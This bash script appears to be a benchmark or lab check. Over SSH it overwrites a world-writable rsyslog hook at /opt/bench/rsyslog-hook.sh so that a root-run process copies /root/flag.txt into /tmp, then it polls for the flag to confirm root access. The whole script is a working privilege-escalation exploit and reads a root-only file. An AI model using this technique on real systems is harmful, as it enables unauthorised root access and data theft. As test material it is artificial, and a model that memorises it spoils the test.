#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/rsyslog_flag
cat > /opt/bench/rsyslog-hook.sh <<'\''EOF'\''
#!/bin/sh
cat /root/flag.txt > /tmp/rsyslog_flag
EOF
chmod 777 /opt/bench/rsyslog-hook.sh
for i in $(seq 1 45); do
  if test -r /tmp/rsyslog_flag && grep -q FLAG /tmp/rsyslog_flag 2>/dev/null; then
    cat /tmp/rsyslog_flag
    exit 0
  fi
  sleep 1
done
exit 1
')"
assert_root_output "${out}"

